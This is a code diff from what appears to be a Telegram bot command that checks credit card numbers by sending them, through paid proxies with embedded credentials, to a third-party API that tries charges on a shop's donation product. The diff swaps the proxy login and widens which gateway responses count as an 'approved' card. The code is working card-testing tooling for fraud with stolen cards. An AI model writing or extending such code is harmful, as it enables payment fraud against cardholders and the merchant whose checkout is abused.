@@ -76,19 +76,19 @@ async def cmd_ho(client, message):
                 "card": fullcc,
                 "product_url": "https://cowdengarden.com/products/donation",
                 "email": None,
-                "proxy": "proxy.rampageproxies.com:5000:package-1111111-country-us:5671nuWwEPrHCw2t",
+                "proxy": "proxy.speedproxies.net:12321:Indexui184a999e:4fba9e5235e8_country-us",
                 "ship_address": None,
                 "is_shippable": False
             }
         }
 
         try:
-            async with httpx.AsyncClient(timeout=20) as http_client:
+            async with httpx.AsyncClient(timeout=30) as http_client:
                 res = await http_client.post("https://api.voidapi.xyz/v2/shopify_graphql", json=payload)
                 response = res.json()
                 msg_raw = response.get("message") or response.get("error") or "No response"
                 msg_check = msg_raw.lower()
-                card_status = "approved" if any(x in msg_check for x in ["processedreceipt", "zip", "avs", "charged"]) else "declined"
+                card_status = "approved" if any(x in msg_check for x in ["processedreceipt", "zip", "avs", "incorrect_cvc", "insufficient", "charged"]) else "declined"
                 card_message = msg_raw
         except Exception as e:
             card_status = "error"
